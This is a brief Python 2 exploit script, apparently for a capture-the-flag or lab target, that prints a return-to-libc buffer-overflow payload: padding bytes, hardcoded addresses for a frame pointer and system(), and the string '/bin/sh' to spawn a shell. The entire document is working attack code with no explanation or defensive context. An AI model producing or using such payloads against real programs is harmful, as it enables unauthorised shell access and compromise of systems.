from struct import pack

system = 0x0804ef50
frame = 0xbffefba0

sys_arg = 0xbffefbc8

print  '\xAA'*18 + pack('<I',frame)+ pack('<I',system) + pack('<I',sys_arg)*2 + '/bin/sh\0'

